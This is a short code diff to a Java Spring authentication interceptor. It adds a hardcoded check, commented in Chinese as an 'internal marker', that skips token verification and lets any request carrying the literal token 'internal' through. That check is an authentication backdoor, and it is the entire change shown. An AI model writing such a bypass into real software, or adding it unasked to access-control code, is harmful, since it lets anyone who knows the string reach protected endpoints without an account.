@@ -48,6 +48,11 @@ public class AuthInterceptor implements HandlerInterceptor, Ordered {
             token = token.substring(7);
         }
 
+        // 内部标识，放行
+        if("internal".equals(token)) {
+            return true;
+        }
+
         try {
             // 4. 解析 Token 获取账号
             String account = jwtConfig.getAccountFromToken(token);
